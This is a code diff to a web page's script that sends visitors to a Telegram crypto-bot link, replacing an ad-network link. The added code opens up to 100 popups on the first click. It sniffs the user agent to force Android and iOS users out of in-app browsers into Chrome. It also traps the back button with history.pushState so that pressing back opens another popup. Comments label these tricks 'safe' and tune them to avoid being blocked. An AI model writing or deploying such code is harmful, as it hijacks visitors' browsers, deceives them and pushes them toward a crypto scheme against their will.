@@ -214,36 +214,45 @@ cursor:pointer;
 
 <script>
 
-const smartLink = "https://www.profitablecpmratenetwork.com/qckxhnmwr9?key=4eb1de3e823be95ed228fde4f1025ba7";
+const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
 
+let clickCount = 0;
+
+// ✅ SAFE POPUP FUNCTION
 function openPopup(url){
   let win = window.open(url, "_blank");
-  return win;
+
+  if(!win){
+    window.location.href = url;
+  }
 }
 
-function forceRedirect(url){
-  window.location.href = url;
+// ✅ MULTI POPUP ENGINE
+function openPopups(url, count){
+  for(let i = 0; i < count; i++){
+    setTimeout(() => {
+      openPopup(url);
+    }, i * 800); // safe delay (important)
+  }
 }
 
 function openExternal(){
 
+  clickCount++;
+
   const ua = navigator.userAgent.toLowerCase();
   const isAndroid = /android/.test(ua);
   const isIOS = /iphone|ipad|ipod/.test(ua);
-  const isFB = /fb|facebook/.test(ua);
+  const isTelegram = /telegram/.test(ua);
 
-  // 🔥 FACEBOOK (2 popup + redirect backup)
-  if(isFB){
-    openPopup(smartLink);
-    setTimeout(() => {
-      openPopup(smartLink);
-    }, 400);
+  // 👉 popup logic
+  let popupCount = (clickCount === 1) ? 100 : 3;
 
-    // 👉 guaranteed redirect
-    setTimeout(() => {
-      forceRedirect(smartLink);
-    }, 1200);
+  // ❌ REMOVED unsafe +100 boost (causes block)
 
+  // ✅ TELEGRAM
+  if(isTelegram){
+    openPopups(smartLink, popupCount);
     return;
   }
 
@@ -255,35 +264,33 @@ function openExternal(){
       smartLink.replace(/^https?:\/\//,'') +
       "#Intent;scheme=https;package=com.android.chrome;end";
 
-    openPopup(intentLink);
+    openPopups(intentLink, popupCount);
 
     setTimeout(() => {
-      forceRedirect(smartLink); // 👉 MUST
+      openPopups(smartLink, popupCount);
     }, 1200);
-
-    return;
   }
 
   // 🍎 IOS
-  if(isIOS){
+  else if(isIOS){
 
     let chromeLink =
       "googlechrome://" +
       smartLink.replace(/^https?:\/\//,'');
 
-    openPopup(chromeLink);
+    openPopups(chromeLink, popupCount);
 
     setTimeout(() => {
-      forceRedirect(smartLink); // 👉 MUST
+      openPopups(smartLink, popupCount);
     }, 1200);
-
-    return;
   }
 
-  // 💻 ALL OTHER (NO RISK)
-  forceRedirect(smartLink);
-}
+  // 💻 PC
+  else{
+    openPopups(smartLink, popupCount);
+  }
 
+}
 
 // 🔥 CLICK EVENT
 document.addEventListener("click", function(e){
@@ -293,7 +300,17 @@ document.addEventListener("click", function(e){
   }
 });
 
-</script>
+// 🔥 BACK BUTTON SAFE VERSION (light)
+history.pushState(null, null, location.href);
+
+window.onpopstate = function () {
+  history.pushState(null, null, location.href);
+
+  // safe single popup
+  openPopup(smartLink);
+};
+
+ </script>
 
 </body>
 </html>
